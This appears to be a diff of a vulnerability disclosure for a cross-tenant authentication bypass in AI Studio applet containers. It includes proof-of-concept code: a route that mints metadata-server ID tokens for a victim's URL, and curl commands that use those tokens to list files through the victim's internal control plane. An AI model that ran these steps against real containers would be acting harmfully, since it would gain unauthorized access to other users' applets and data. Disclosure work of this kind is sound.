@@ -8,11 +8,12 @@ title: AI Studio Auth bypass
 
 ### Details
 
-AI Studio containers have two different auth systems one is user_auth_verification.lua but there is also /__aistudio_internal_control_plane that uses a golang app called control-plane-api and is designed to only accept signed requests from the Google backend except  /__aistudio_internal_control_plane/health because that ones special.
+AI Studio containers have two different auth systems one is user_auth_verification.lua but there is also /__aistudio_internal_control_plane that uses a golang app called control-plane-api and is designed to only accept signed requests from the Google backend except /__aistudio_internal_control_plane/health because that ones special.
 
 However using the metadata API its possible from the attackers container to sign a request for the victims container due to a shared SA.
 
 From the attackers container mint a signature for the victims container
+
 ```
 app.get(`${endpoint}/mintid`, async (req, res) => {
   const aud = String(req.query.aud || '');
@@ -23,8 +24,10 @@ app.get(`${endpoint}/mintid`, async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 ```
+
 For example https://ais-dev-ieym56sbhi3e3yugjrclgb-498368762413.europe-west2.run.app/__cp_tap_CPshFhdBeJg2/mintid?aud=https://ais-dev-wz5qlkb3fdlkip3rkpzf47-505266060889.europe-west2.run.app
 Then the attacker can speak on behalf of the backend to run commands on the victim.
+
 ```
 curl -i -H "Authorization: Bearer eyJ..." -H "Accept: application/json" "https://ais-dev-wz5qlkb3fdlkip3rkpzf47-505266060889.europe-west2.run.app/__aistudio_internal_control_plane/fs/list?path=.&recursive=false&exclude="
 ```
@@ -40,7 +43,6 @@ Cross-tenant authentication bypass on AI Studio applet control plane via shared 
 AI Studio applet containers have two auth systems: user_auth_verification.lua gates the user-facing applet at /, and control-plane-api (Go binary) gates the management API at /__aistudio_internal_control_plane/*. The latter is designed to only accept Google-signed ID tokens from Google's backend orchestrator; /__aistudio_internal_control_plane/health is exempt and returns a fixed liveness JSON.
 
 The control-plane validates tokens via:
-
 
 audience := fmt.Sprintf("https://%s", r.Host)
 idtoken.Validate(ctx, token, audience)
@@ -60,7 +62,7 @@ GET http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/
 Use the minted token against C's control plane:
 
 curl -H "Authorization: Bearer <token>" \
-     "https://<C-url>/__aistudio_internal_control_plane/fs/list?path=.&recursive=false&exclude="
+"https://<C-url>/__aistudio_internal_control_plane/fs/list?path=.&recursive=false&exclude="
 Returns HTTP 200 with C's app directory listing.
 Impact: the full control-plane surface is reachable in any victim applet whose URL is known:
 
